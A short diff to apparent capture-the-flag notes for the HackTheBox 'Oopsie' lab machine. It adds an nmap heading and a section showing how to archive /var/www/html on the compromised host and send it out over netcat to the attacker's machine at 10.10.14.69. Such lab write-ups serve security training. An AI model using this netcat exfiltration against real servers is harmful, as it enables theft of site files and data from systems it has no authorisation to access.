@@ -3,6 +3,8 @@ inet6 fe80::d484:44d2:fd97:c02c
 
 # Oopsie
 
+## nmap
+
 sudo nmap -sC -sV -A 10.10.10.28
 
 Nmap scan report for 10.10.10.28
@@ -187,3 +189,14 @@ UserGroups:
         </Server>
     </RecentServers>
 </FileZilla3>
+
+## Get the /var/www/html files
+
+- in /var/www wrap html first
+tar -czf html.tar.gz html
+
+**server**
+> cat html.tar.gz | nc 10.10.14.69 *any port*
+
+**client**
+> nc -l -p *any port* -q 1 > html.tar.gz < /dev/null
